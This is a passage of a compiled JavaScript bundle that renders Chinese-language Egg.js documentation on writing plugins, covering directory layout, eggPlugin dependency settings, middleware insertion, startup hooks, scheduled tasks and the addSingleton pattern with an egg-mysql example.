\u5df2\u7ecf\u6709\u4e86\u4e2d\u95f4\u4ef6\u7684\u673a\u5236\uff0c\u4e3a\u5565\u8fd8\u8981\u63d2\u4ef6\u5462\uff1f"),r.a.createElement("li",null,"\u4e2d\u95f4\u4ef6\u3001\u63d2\u4ef6\u3001\u5e94\u7528\u5b83\u4eec\u4e4b\u95f4\u662f\u4ec0\u4e48\u5173\u7cfb\uff0c\u6709\u4ec0\u4e48\u533a\u522b\uff1f"),r.a.createElement("li",null,"\u6211\u8be5\u600e\u4e48\u4f7f\u7528\u4e00\u4e2a\u63d2\u4ef6\uff1f"),r.a.createElement("li",null,"\u5982\u4f55\u7f16\u5199\u4e00\u4e2a\u63d2\u4ef6\uff1f"),r.a.createElement("li",null,"...")),r.a.createElement("p",null,"\u5728",r.a.createElement(l["Link"],{to:"../basics/plugin"},"\u4f7f\u7528\u63d2\u4ef6"),"\u7ae0\u8282\u6211\u4eec\u5df2\u7ecf\u8ba8\u8bba\u8fc7\u524d\u51e0\u70b9\uff0c\u63a5\u4e0b\u6765\u6211\u4eec\u6765\u770b\u770b\u5982\u4f55\u5f00\u53d1\u4e00\u4e2a\u63d2\u4ef6\u3002"),r.a.createElement("h2",{id:"\u63d2\u4ef6\u5f00\u53d1"},r.a.createElement(l["AnchorLink"],{to:"#\u63d2\u4ef6\u5f00\u53d1","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u63d2\u4ef6\u5f00\u53d1"),r.a.createElement("h3",{id:"\u4f7f\u7528\u811a\u624b\u67b6\u5feb\u901f\u5f00\u53d1"},r.a.createElement(l["AnchorLink"],{to:"#\u4f7f\u7528\u811a\u624b\u67b6\u5feb\u901f\u5f00\u53d1","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u4f7f\u7528\u811a\u624b\u67b6\u5feb\u901f\u5f00\u53d1"),r.a.createElement("p",null,"\u4f60\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528 ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-boilerplate-plugin"},"egg-boilerplate-plugin")," \u811a\u624b\u67b6\u6765\u5feb\u901f\u4e0a\u624b\u3002"),r.a.createElement(o["a"],{code:"$ mkdir egg-hello && cd egg-hello\n$ npm init egg --type=plugin\n$ npm i\n$ npm test",lang:"bash"}),r.a.createElement("h2",{id:"\u63d2\u4ef6\u7684\u76ee\u5f55\u7ed3\u6784"},r.a.createElement(l["AnchorLink"],{to:"#\u63d2\u4ef6\u7684\u76ee\u5f55\u7ed3\u6784","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u63d2\u4ef6\u7684\u76ee\u5f55\u7ed3\u6784"),r.a.createElement("p",null,"\u4e00\u4e2a\u63d2\u4ef6\u5176\u5b9e\u5c31\u662f\u4e00\u4e2a\u300e\u8ff7\u4f60\u7684\u5e94\u7528\u300f\uff0c\u4e0b\u9762\u5c55\u793a\u7684\u662f\u4e00\u4e2a\u63d2\u4ef6\u7684\u76ee\u5f55\u7ed3\u6784\uff0c\u548c\u5e94\u7528\uff08app\uff09\u51e0\u4e4e\u4e00\u6837\u3002"),r.a.createElement(o["a"],{code:". egg-hello\n\u251c\u2500\u2500 package.json\n\u251c\u2500\u2500 app.js (\u53ef\u9009)\n\u251c\u2500\u2500 agent.js (\u53ef\u9009)\n\u251c\u2500\u2500 app\n\u2502   \u251c\u2500\u2500 extend (\u53ef\u9009)\n\u2502   |   \u251c\u2500\u2500 helper.js (\u53ef\u9009)\n\u2502   |   \u251c\u2500\u2500 request.js (\u53ef\u9009)\n\u2502   |   \u251c\u2500\u2500 response.js (\u53ef\u9009)\n\u2502   |   \u251c\u2500\u2500 context.js (\u53ef\u9009)\n\u2502   |   \u251c\u2500\u2500 application.js (\u53ef\u9009)\n\u2502   |   \u2514\u2500\u2500 agent.js (\u53ef\u9009)\n\u2502   \u251c\u2500\u2500 service (\u53ef\u9009)\n\u2502   \u2514\u2500\u2500 middleware (\u53ef\u9009)\n\u2502       \u2514\u2500\u2500 mw.js\n\u251c\u2500\u2500 config\n|   \u251c\u2500\u2500 config.default.js\n\u2502   \u251c\u2500\u2500 config.prod.js\n|   \u251c\u2500\u2500 config.test.js (\u53ef\u9009)\n|   \u251c\u2500\u2500 config.local.js (\u53ef\u9009)\n|   \u2514\u2500\u2500 config.unittest.js (\u53ef\u9009)\n\u2514\u2500\u2500 test\n    \u2514\u2500\u2500 middleware\n        \u2514\u2500\u2500 mw.test.js",lang:"js"}),r.a.createElement("p",null,"\u90a3\u533a\u522b\u5728\u54ea\u513f\u5462\uff1f"),r.a.createElement("ol",null,r.a.createElement("li",null,r.a.createElement("p",null,"\u63d2\u4ef6\u6ca1\u6709\u72ec\u7acb\u7684 router \u548c controller\u3002\u8fd9\u4e3b\u8981\u51fa\u4e8e\u51e0\u70b9\u8003\u8651\uff1a"),r.a.createElement("ul",null,r.a.createElement("li",null,"\u8def\u7531\u4e00\u822c\u548c\u5e94\u7528\u5f3a\u7ed1\u5b9a\u7684\uff0c\u4e0d\u5177\u5907\u901a\u7528\u6027\u3002"),r.a.createElement("li",null,"\u4e00\u4e2a\u5e94\u7528\u53ef\u80fd\u4f9d\u8d56\u5f88\u591a\u4e2a\u63d2\u4ef6\uff0c\u5982\u679c\u63d2\u4ef6\u652f\u6301\u8def\u7531\u53ef\u80fd\u5bfc\u81f4\u8def\u7531\u51b2\u7a81\u3002"),r.a.createElement("li",null,"\u5982\u679c\u786e\u5b9e\u6709\u7edf\u4e00\u8def\u7531\u7684\u9700\u6c42\uff0c\u53ef\u4ee5\u8003\u8651\u5728\u63d2\u4ef6\u91cc\u901a\u8fc7\u4e2d\u95f4\u4ef6\u6765\u5b9e\u73b0\u3002"))),r.a.createElement("li",null,r.a.createElement("p",null,"\u63d2\u4ef6\u9700\u8981\u5728 ",r.a.createElement("code",null,"package.json")," \u4e2d\u7684 ",r.a.createElement("code",null,"eggPlugin")," \u8282\u70b9\u6307\u5b9a\u63d2\u4ef6\u7279\u6709\u7684\u4fe1\u606f\uff1a"),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement("p",null,r.a.createElement("code",null,"{","String","}"," name")," - \u63d2\u4ef6\u540d\uff08\u5fc5\u987b\u914d\u7f6e\uff09\uff0c\u5177\u6709\u552f\u4e00\u6027\uff0c\u914d\u7f6e\u4f9d\u8d56\u5173\u7cfb\u65f6\u4f1a\u6307\u5b9a\u4f9d\u8d56\u63d2\u4ef6\u7684 name\u3002")),r.a.createElement("li",null,r.a.createElement("p",null,r.a.createElement("code",null,"{","Array","}"," dependencies")," - \u5f53\u524d\u63d2\u4ef6\u5f3a\u4f9d\u8d56\u7684\u63d2\u4ef6\u5217\u8868\uff08\u5982\u679c\u4f9d\u8d56\u7684\u63d2\u4ef6\u6ca1\u627e\u5230\uff0c\u5e94\u7528\u542f\u52a8\u5931\u8d25\uff09\u3002")),r.a.createElement("li",null,r.a.createElement("p",null,r.a.createElement("code",null,"{","Array","}"," optionalDependencies")," - \u5f53\u524d\u63d2\u4ef6\u7684\u53ef\u9009\u4f9d\u8d56\u63d2\u4ef6\u5217\u8868\uff08\u5982\u679c\u4f9d\u8d56\u7684\u63d2\u4ef6\u672a\u5f00\u542f\uff0c\u53ea\u4f1a warning\uff0c\u4e0d\u4f1a\u5f71\u54cd\u5e94\u7528\u542f\u52a8\uff09\u3002")),r.a.createElement("li",null,r.a.createElement("p",null,r.a.createElement("code",null,"{","Array","}"," env")," - \u53ea\u6709\u5728\u6307\u5b9a\u8fd0\u884c\u73af\u5883\u624d\u80fd\u5f00\u542f\uff0c\u5177\u4f53\u6709\u54ea\u4e9b\u73af\u5883\u53ef\u4ee5\u53c2\u8003",r.a.createElement(l["Link"],{to:"../basics/env"},"\u8fd0\u884c\u73af\u5883"),"\u3002\u6b64\u914d\u7f6e\u662f\u53ef\u9009\u7684\uff0c\u4e00\u822c\u60c5\u51b5\u4e0b\u90fd\u4e0d\u9700\u8981\u914d\u7f6e\u3002"),r.a.createElement(o["a"],{code:'{\n  "name": "egg-rpc",\n  "eggPlugin": {\n    "name": "rpc",\n    "dependencies": ["registry"],\n    "optionalDependencies": ["vip"],\n    "env": ["local", "test", "unittest", "prod"]\n  }\n}',lang:"json"})))),r.a.createElement("li",null,r.a.createElement("p",null,"\u63d2\u4ef6\u6ca1\u6709 ",r.a.createElement("code",null,"plugin.js"),"\uff1a"),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement("code",null,"eggPlugin.dependencies")," \u53ea\u662f\u7528\u4e8e\u58f0\u660e\u4f9d\u8d56\u5173\u7cfb\uff0c\u800c\u4e0d\u662f\u5f15\u5165\u63d2\u4ef6\u6216\u5f00\u542f\u63d2\u4ef6\u3002"),r.a.createElement("li",null,"\u5982\u679c\u671f\u671b\u7edf\u4e00\u7ba1\u7406\u591a\u4e2a\u63d2\u4ef6\u7684\u5f00\u542f\u548c\u914d\u7f6e\uff0c\u53ef\u4ee5\u5728",r.a.createElement(l["Link"],{to:"./framework"},"\u4e0a\u5c42\u6846\u67b6"),"\u5904\u7406\u3002")))),r.a.createElement("h2",{id:"\u63d2\u4ef6\u7684\u4f9d\u8d56\u7ba1\u7406"},r.a.createElement(l["AnchorLink"],{to:"#\u63d2\u4ef6\u7684\u4f9d\u8d56\u7ba1\u7406","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u63d2\u4ef6\u7684\u4f9d\u8d56\u7ba1\u7406"),r.a.createElement("p",null,"\u548c\u4e2d\u95f4\u4ef6\u4e0d\u540c\uff0c\u63d2\u4ef6\u662f\u81ea\u5df1\u7ba1\u7406\u4f9d\u8d56\u7684\u3002\u5e94\u7528\u5728\u52a0\u8f7d\u6240\u6709\u63d2\u4ef6\u524d\u4f1a\u9884\u5148\u4ece\u5b83\u4eec\u7684 ",r.a.createElement("code",null,"package.json")," \u4e2d\u8bfb\u53d6 ",r.a.createElement("code",null,"eggPlugin > dependencies")," \u548c ",r.a.createElement("code",null,"eggPlugin > optionalDependencies")," \u8282\u70b9\uff0c\u7136\u540e\u6839\u636e\u4f9d\u8d56\u5173\u7cfb\u8ba1\u7b97\u51fa\u52a0\u8f7d\u987a\u5e8f\uff0c\u4e3e\u4e2a\u4f8b\u5b50\uff0c\u4e0b\u9762\u4e09\u4e2a\u63d2\u4ef6\u7684\u52a0\u8f7d\u987a\u5e8f\u5c31\u5e94\u8be5\u662f ",r.a.createElement("code",null,"c => b => a")),r.a.createElement(o["a"],{code:'// plugin a\n{\n  "name": "egg-plugin-a",\n  "eggPlugin": {\n    "name": "a",\n    "dependencies": [ "b" ]\n  }\n}\n\n// plugin b\n{\n  "name": "egg-plugin-b",\n  "eggPlugin": {\n    "name": "b",\n    "optionalDependencies": [ "c" ]\n  }\n}\n\n// plugin c\n{\n  "name": "egg-plugin-c",\n  "eggPlugin": {\n    "name": "c"\n  }\n}',lang:"json"}),r.a.createElement("p",null,r.a.createElement("strong",null,"\u6ce8\u610f\uff1a",r.a.createElement("code",null,"dependencies")," \u548c ",r.a.createElement("code",null,"optionalDependencies")," \u7684\u53d6\u503c\u662f\u53e6\u4e00\u4e2a\u63d2\u4ef6\u7684 ",r.a.createElement("code",null,"eggPlugin.name"),"\uff0c\u800c\u4e0d\u662f ",r.a.createElement("code",null,"package name"),"\u3002")),r.a.createElement("p",null,r.a.createElement("code",null,"dependencies")," \u548c ",r.a.createElement("code",null,"optionalDependencies")," \u662f\u4ece ",r.a.createElement("code",null,"npm")," \u501f\u9274\u6765\u7684\u6982\u5ff5\uff0c\u5927\u591a\u6570\u60c5\u51b5\u4e0b\u6211\u4eec\u90fd\u4f7f\u7528 ",r.a.createElement("code",null,"dependencies"),"\uff0c\u8fd9\u4e5f\u662f\u6211\u4eec\u6700\u63a8\u8350\u7684\u4f9d\u8d56\u65b9\u5f0f\u3002\u90a3\u4ec0\u4e48\u65f6\u5019\u53ef\u4ee5\u7528 ",r.a.createElement("code",null,"optionalDependencies")," \u5462\uff1f\u5927\u81f4\u5c31\u4e24\u79cd\uff1a"),r.a.createElement("ul",null,r.a.createElement("li",null,"\u53ea\u5728\u67d0\u4e9b\u73af\u5883\u4e0b\u624d\u4f9d\u8d56\uff0c\u6bd4\u5982\uff1a\u4e00\u4e2a\u9274\u6743\u63d2\u4ef6\uff0c\u53ea\u5728\u5f00\u53d1\u73af\u5883\u4f9d\u8d56\u4e00\u4e2a mock \u6570\u636e\u7684\u63d2\u4ef6"),r.a.createElement("li",null,"\u5f31\u4f9d\u8d56\uff0c\u6bd4\u5982\uff1aA \u4f9d\u8d56 B\uff0c\u4f46\u662f\u5982\u679c\u6ca1\u6709 B\uff0cA \u6709\u76f8\u5e94\u7684\u964d\u7ea7\u65b9\u6848")),r.a.createElement("p",null,"\u9700\u8981\u7279\u522b\u5f3a\u8c03\u7684\u662f\uff1a\u5982\u679c\u91c7\u7528 ",r.a.createElement("code",null,"optionalDependencies")," \u90a3\u4e48\u6846\u67b6\u4e0d\u4f1a\u6821\u9a8c\u4f9d\u8d56\u7684\u63d2\u4ef6\u662f\u5426\u5f00\u542f\uff0c\u5b83\u7684\u4f5c\u7528\u4ec5\u4ec5\u662f\u8ba1\u7b97\u52a0\u8f7d\u987a\u5e8f\u3002\u6240\u4ee5\uff0c\u8fd9\u65f6\u5019\u4f9d\u8d56\u65b9\u9700\u8981\u901a\u8fc7\u300e\u63a5\u53e3\u63a2\u6d4b\u300f\u7b49\u65b9\u5f0f\u6765\u51b3\u5b9a\u76f8\u5e94\u7684\u5904\u7406\u903b\u8f91\u3002"),r.a.createElement("h2",{id:"\u63d2\u4ef6\u80fd\u505a\u4ec0\u4e48"},r.a.createElement(l["AnchorLink"],{to:"#\u63d2\u4ef6\u80fd\u505a\u4ec0\u4e48","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u63d2\u4ef6\u80fd\u505a\u4ec0\u4e48\uff1f"),r.a.createElement("p",null,"\u4e0a\u9762\u7ed9\u51fa\u4e86\u63d2\u4ef6\u7684\u5b9a\u4e49\uff0c\u90a3\u63d2\u4ef6\u5230\u5e95\u80fd\u505a\u4ec0\u4e48\uff1f"),r.a.createElement("h3",{id:"\u6269\u5c55\u5185\u7f6e\u5bf9\u8c61\u7684\u63a5\u53e3"},r.a.createElement(l["AnchorLink"],{to:"#\u6269\u5c55\u5185\u7f6e\u5bf9\u8c61\u7684\u63a5\u53e3","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u6269\u5c55\u5185\u7f6e\u5bf9\u8c61\u7684\u63a5\u53e3"),r.a.createElement("p",null,"\u5728\u63d2\u4ef6\u76f8\u5e94\u7684\u6587\u4ef6\u5185\u5bf9\u6846\u67b6\u5185\u7f6e\u5bf9\u8c61\u8fdb\u884c\u6269\u5c55\uff0c\u548c\u5e94\u7528\u4e00\u6837"),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement("code",null,"app/extend/request.js")," - \u6269\u5c55 Koa#Request \u7c7b"),r.a.createElement("li",null,r.a.createElement("code",null,"app/extend/response.js")," - \u6269\u5c55 Koa#Response \u7c7b"),r.a.createElement("li",null,r.a.createElement("code",null,"app/extend/context.js")," - \u6269\u5c55 Koa#Context \u7c7b"),r.a.createElement("li",null,r.a.createElement("code",null,"app/extend/helper.js ")," - \u6269\u5c55 Helper \u7c7b"),r.a.createElement("li",null,r.a.createElement("code",null,"app/extend/application.js")," - \u6269\u5c55 Application \u7c7b"),r.a.createElement("li",null,r.a.createElement("code",null,"app/extend/agent.js")," - \u6269\u5c55 Agent \u7c7b")),r.a.createElement("h3",{id:"\u63d2\u5165\u81ea\u5b9a\u4e49\u4e2d\u95f4\u4ef6"},r.a.createElement(l["AnchorLink"],{to:"#\u63d2\u5165\u81ea\u5b9a\u4e49\u4e2d\u95f4\u4ef6","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u63d2\u5165\u81ea\u5b9a\u4e49\u4e2d\u95f4\u4ef6"),r.a.createElement("ol",null,r.a.createElement("li",null,r.a.createElement("p",null,"\u9996\u5148\u5728 ",r.a.createElement("code",null,"app/middleware")," \u76ee\u5f55\u4e0b\u5b9a\u4e49\u597d\u4e2d\u95f4\u4ef6\u5b9e\u73b0"),r.a.createElement(o["a"],{code:"'use strict';\n\nconst staticCache = require('koa-static-cache');\nconst assert = require('assert');\nconst mkdirp = require('mkdirp');\n\nmodule.exports = (options, app) => {\n  assert.strictEqual(\n    typeof options.dir,\n    'string',\n    'Must set `app.config.static.dir` when static plugin enable',\n  );\n\n  // ensure directory exists\n  mkdirp.sync(options.dir);\n\n  app.loggers.coreLogger.info(\n    '[egg-static] starting static serve %s -> %s',\n    options.prefix,\n    options.dir,\n  );\n\n  return staticCache(options);\n};",lang:"js"})),r.a.createElement("li",null,r.a.createElement("p",null,"\u5728 ",r.a.createElement("code",null,"app.js")," \u4e2d\u5c06\u4e2d\u95f4\u4ef6\u63d2\u5165\u5230\u5408\u9002\u7684\u4f4d\u7f6e\uff08\u4f8b\u5982\uff1a\u4e0b\u9762\u5c06 static \u4e2d\u95f4\u4ef6\u653e\u5230 bodyParser \u4e4b\u524d\uff09"),r.a.createElement(o["a"],{code:"const assert = require('assert');\n\nmodule.exports = (app) => {\n  // \u5c06 static \u4e2d\u95f4\u4ef6\u653e\u5230 bodyParser \u4e4b\u524d\n  const index = app.config.coreMiddleware.indexOf('bodyParser');\n  assert(index >= 0, 'bodyParser \u4e2d\u95f4\u4ef6\u5fc5\u987b\u5b58\u5728');\n\n  app.config.coreMiddleware.splice(index, 0, 'static');\n};",lang:"js"}))),r.a.createElement("h3",{id:"\u5728\u5e94\u7528\u542f\u52a8\u65f6\u505a\u4e00\u4e9b\u521d\u59cb\u5316\u5de5\u4f5c"},r.a.createElement(l["AnchorLink"],{to:"#\u5728\u5e94\u7528\u542f\u52a8\u65f6\u505a\u4e00\u4e9b\u521d\u59cb\u5316\u5de5\u4f5c","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u5728\u5e94\u7528\u542f\u52a8\u65f6\u505a\u4e00\u4e9b\u521d\u59cb\u5316\u5de5\u4f5c"),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement("p",null,"\u6211\u5728\u542f\u52a8\u524d\u60f3\u8bfb\u53d6\u4e00\u4e9b\u672c\u5730\u914d\u7f6e"),r.a.createElement(o["a"],{code:"// ${plugin_root}/app.js\nconst fs = require('fs');\nconst path = require('path');\n\nmodule.exports = (app) => {\n  app.customData = fs.readFileSync(path.join(app.config.baseDir, 'data.bin'));\n\n  app.coreLogger.info('read data ok');\n};",lang:"js"})),r.a.createElement("li",null,r.a.createElement("p",null,"\u5982\u679c\u6709\u5f02\u6b65\u542f\u52a8\u903b\u8f91\uff0c\u53ef\u4ee5\u4f7f\u7528 ",r.a.createElement("code",null,"app.beforeStart")," API"),r.a.createElement(o["a"],{code:"// ${plugin_root}/app.js\nconst MyClient = require('my-client');\n\nmodule.exports = (app) => {\n  app.myClient = new MyClient();\n  app.myClient.on('error', (err) => {\n    app.coreLogger.error(err);\n  });\n  app.beforeStart(async () => {\n    await app.myClient.ready();\n    app.coreLogger.info('my client is ready');\n  });\n};",lang:"js"})),r.a.createElement("li",null,r.a.createElement("p",null,"\u4e5f\u53ef\u4ee5\u6dfb\u52a0 agent \u542f\u52a8\u903b\u8f91\uff0c\u4f7f\u7528 ",r.a.createElement("code",null,"agent.beforeStart")," API"),r.a.createElement(o["a"],{code:"// ${plugin_root}/agent.js\nconst MyClient = require('my-client');\n\nmodule.exports = (agent) => {\n  agent.myClient = new MyClient();\n  agent.myClient.on('error', (err) => {\n    agent.coreLogger.error(err);\n  });\n  agent.beforeStart(async () => {\n    await agent.myClient.ready();\n    agent.coreLogger.info('my client is ready');\n  });\n};",lang:"js"}))),r.a.createElement("h3",{id:"\u8bbe\u7f6e\u5b9a\u65f6\u4efb\u52a1"},r.a.createElement(l["AnchorLink"],{to:"#\u8bbe\u7f6e\u5b9a\u65f6\u4efb\u52a1","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u8bbe\u7f6e\u5b9a\u65f6\u4efb\u52a1"),r.a.createElement("ol",null,r.a.createElement("li",null,r.a.createElement("p",null,"\u5728 ",r.a.createElement("code",null,"package.json")," \u91cc\u8bbe\u7f6e\u4f9d\u8d56 schedule \u63d2\u4ef6"),r.a.createElement(o["a"],{code:'{\n  "name": "your-plugin",\n  "eggPlugin": {\n    "name": "your-plugin",\n    "dependencies": ["schedule"]\n  }\n}',lang:"json"})),r.a.createElement("li",null,r.a.createElement("p",null,"\u5728 ",r.a.createElement("code",null,"$","{","plugin_root","}","/app/schedule/")," \u76ee\u5f55\u4e0b\u65b0\u5efa\u6587\u4ef6\uff0c\u7f16\u5199\u4f60\u7684\u5b9a\u65f6\u4efb\u52a1"),r.a.createElement(o["a"],{code:"exports.schedule = {\n  type: 'worker',\n  cron: '0 0 3 * * *',\n  // interval: '1h',\n  // immediate: true,\n};\n\nexports.task = async (ctx) => {\n  // your logic code\n};",lang:"js"}))),r.a.createElement("h3",{id:"\u5168\u5c40\u5b9e\u4f8b\u63d2\u4ef6\u7684\u6700\u4f73\u5b9e\u8df5"},r.a.createElement(l["AnchorLink"],{to:"#\u5168\u5c40\u5b9e\u4f8b\u63d2\u4ef6\u7684\u6700\u4f73\u5b9e\u8df5","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u5168\u5c40\u5b9e\u4f8b\u63d2\u4ef6\u7684\u6700\u4f73\u5b9e\u8df5"),r.a.createElement("p",null,"\u8bb8\u591a\u63d2\u4ef6\u7684\u76ee\u7684\u90fd\u662f\u5c06\u4e00\u4e9b\u5df2\u6709\u7684\u670d\u52a1\u5f15\u5165\u5230\u6846\u67b6\u4e2d\uff0c\u5982 ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-mysql"},"egg-mysql"),", ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-oss"},"egg-oss"),"\u3002\u4ed6\u4eec\u90fd\u9700\u8981\u5728 app \u4e0a\u521b\u5efa\u5bf9\u5e94\u7684\u5b9e\u4f8b\u3002\u800c\u5728\u5f00\u53d1\u8fd9\u4e00\u7c7b\u7684\u63d2\u4ef6\u65f6\uff0c\u6211\u4eec\u53d1\u73b0\u5b58\u5728\u4e00\u4e9b\u666e\u904d\u6027\u7684\u95ee\u9898\uff1a"),r.a.createElement("ul",null,r.a.createElement("li",null,"\u5728\u4e00\u4e2a\u5e94\u7528\u4e2d\u540c\u65f6\u4f7f\u7528\u540c\u4e00\u4e2a\u670d\u52a1\u7684\u4e0d\u540c\u5b9e\u4f8b\uff08\u8fde\u63a5\u5230\u4e24\u4e2a\u4e0d\u540c\u7684 MySQL \u6570\u636e\u5e93\uff09\u3002"),r.a.createElement("li",null,"\u4ece\u5176\u4ed6\u670d\u52a1\u83b7\u53d6\u914d\u7f6e\u540e\u52a8\u6001\u521d\u59cb\u5316\u8fde\u63a5\uff08\u4ece\u914d\u7f6e\u4e2d\u5fc3\u83b7\u53d6\u5230 MySQL \u670d\u52a1\u5730\u5740\u540e\u518d\u5efa\u7acb\u8fde\u63a5\uff09\u3002")),r.a.createElement("p",null,"\u5982\u679c\u8ba9\u63d2\u4ef6\u5404\u81ea\u5b9e\u73b0\uff0c\u53ef\u80fd\u4f1a\u51fa\u73b0\u5404\u79cd\u5947\u602a\u7684\u914d\u7f6e\u65b9\u5f0f\u548c\u521d\u59cb\u5316\u65b9\u5f0f\uff0c\u6240\u4ee5\u6846\u67b6\u63d0\u4f9b\u4e86 ",r.a.createElement("code",null,"app.addSingleton(name, creator)")," \u65b9\u6cd5\u6765\u7edf\u4e00\u8fd9\u4e00\u7c7b\u670d\u52a1\u7684\u521b\u5efa\u3002\u9700\u8981\u6ce8\u610f\u7684\u662f\u5728\u4f7f\u7528 ",r.a.createElement("code",null,"app.addSingleton(name, creator)")," \u65b9\u6cd5\u65f6\uff0c\u914d\u7f6e\u6587\u4ef6\u4e2d\u4e00\u5b9a\u8981\u6709 ",r.a.createElement("code",null,"client")," \u6216\u8005 ",r.a.createElement("code",null,"clients")," \u4e3a key \u7684\u914d\u7f6e\u4f5c\u4e3a\u4f20\u5165 ",r.a.createElement("code",null,"creator")," \u51fd\u6570 \u7684 ",r.a.createElement("code",null,"config"),"\u3002"),r.a.createElement("h4",{id:"\u63d2\u4ef6\u5199\u6cd5"},r.a.createElement(l["AnchorLink"],{to:"#\u63d2\u4ef6\u5199\u6cd5","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u63d2\u4ef6\u5199\u6cd5"),r.a.createElement("p",null,"\u6211\u4eec\u5c06 ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-mysql"},"egg-mysql")," \u7684\u5b9e\u73b0\u7b80\u5316\u4e4b\u540e\u6765\u770b\u770b\u5982\u4f55\u7f16\u5199\u6b64\u7c7b\u63d2\u4ef6\uff1a"),r.a.createElement(o["a"],{code:"// egg-mysql/app.js\nmodule.exports = (app) => {\n  // \u7b2c\u4e00\u4e2a\u53c2\u6570 mysql \u6307\u5b9a\u4e86\u6302\u8f7d\u5230 app \u4e0a\u7684\u5b57\u6bb5\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7 `app.mysql` \u8bbf\u95ee\u5230 MySQL singleton \u5b9e\u4f8b\n  // \u7b2c\u4e8c\u4e2a\u53c2\u6570 createMysql \u63a5\u53d7\u4e24\u4e2a\u53c2\u6570(config, app)\uff0c\u5e76\u8fd4\u56de\u4e00\u4e2a MySQL \u7684\u5b9e\u4f8b\n  app.addSingleton('mysql', createMysql);\n};\n\n/**\n * @param  {Object} config   \u6846\u67b6\u5904\u7406\u4e4b\u540e\u7684\u914d\u7f6e\u9879\uff0c\u5982\u679c\u5e94\u7528\u914d\u7f6e\u4e86\u591a\u4e2a MySQL \u5b9e\u4f8b\uff0c\u4f1a\u5c06\u6bcf\u4e00\u4e2a\u914d\u7f6e\u9879\u5206\u522b\u4f20\u5165\u5e76\u8c03\u7528\u591a\u6b21 createMysql\n * @param  {Application} app \u5f53\u524d\u7684\u5e94\u7528\n * @return {Object}          \u8fd4\u56de\u521b\u5efa\u7684 MySQL \u5b9e\u4f8b\n */\nfunction createMysql(config, app) {\n  assert(config.host && config.port && config.user && config.database);\n  // \u521b\u5efa\u5b9e\u4f8b\n  const client = new Mysql(config);\n\n  // \u505a\u542f\u52a8\u5e94\u7528\u524d\u7684\u68c0\u67e5\n  app.beforeStart(async () => {\n    const rows = await client.query('select now() as currentTime;');\n    app.coreLogger.info(\n      `[egg-mysql] init instance success, rds currentTime: ${rows[0].currentTime}`,\n    );\n  });\n\n  return client;\n}",lang:"js"}),r.a.createElement("p",null,"\u521d\u59cb\u5316\u65b9\u6cd5\u4e5f\u652f\u6301 ",r.a.createElement("code",null,"Async function"),"\uff0c\u4fbf\u4e8e\u6709\u4e9b\u7279\u6b8a\u7684\u63d2\u4ef6\u9700\u8981\u5f02\u6b65\u5316\u83b7\u53d6\u4e00\u4e9b\u914d\u7f6e\u6587\u4ef6\uff1a"),r.a.createElement(o["a"],{code:"async function createMysql(config, app) {\n  // \u5f02\u6b65\u83b7\u53d6 mysql \u914d\u7f6e\n  const mysqlConfig = await app.configManager.getMysqlConfig(config.mysql);\n  assert(\n    mysqlConfig.host &&\n      mysqlConfig.port &&\n      mysqlConfig.user &&\n      mysqlConfig.database,\n  );\n  // \u521b\u5efa\u5b9e\u4f8b\n  const client = new Mysql(mysqlConfig);\n\n  // \u505a\u542f\u52a8\u5e94\u7528\u524d\u7684\u68c0\u67e5\n  const rows = await client.query('select now() as currentTime;');\n  app.coreLogger.info(\n    `[egg-mysql] init instance success, rds currentTime: ${rows[0].currentTime}`,\n  );\n\n  return client;\n}",lang:"js"}),r.a.createElement("p",null,"\u53ef\u4ee5\u770b\u5230\uff0c\u63d2\u4ef6\u4e2d\u6211\u4eec\u53ea\u9700\u8981\u63d0\u4f9b\u8981\u6302\u8f7d\u7684\u5b57\u6bb5\u4ee5\u53ca\u5bf9\u5e94\u670d\u52a1\u7684\u521d\u59cb\u5316\u65b9\u6cd5\uff0c\u6240\u6709\u7684\u914d\u7f6e\u7ba1\u7406\u3001\u5b9e\u4f8b\u83b7\u53d6\u65b9\u5f0f\u90fd\u7531\u6846\u67b6\u5c01\u88c5\u5e76\u7edf\u4e00\u63d0\u4f9b\u4e86\u3002"),r.a.createElement("h4",{id:"\u5e94\u7528\u5c42\u4f7f\u7528\u65b9\u6848"},r.a.createElement(l["AnchorLink"],{to:"#\u5e94\u7528\u5c42\u4f7f\u7528\u65b9\u6848","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u5e94\u7528\u5c42\u4f7f\u7528\u65b9\u6848"),r.a.createElement("h5",{id:"\u5355\u5b9e\u4f8b"},r.a.createElement(l["AnchorLink"],{to:"#\u5355\u5b9e\u4f8b","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u5355\u5b9e\u4f8b"),r.a.createElement("ol",null,r.a.createElement("li",null,r.a.createElement("p",null,"\u5728\u914d\u7f6e\u6587\u4ef6\u4e2d\u58f0\u660e MySQL \u7684\u914d\u7f6e\u3002"),r.a.createElement(o["a"],{code:"// config/config.default.js\nmodule.exports = {\n  mysql: {\n    client: {\n      host: 'mysql.com',\n      port: '3306',\n      user: 'test_user',\n      password: 'test_password',\n      database: 'test',\n    },\n  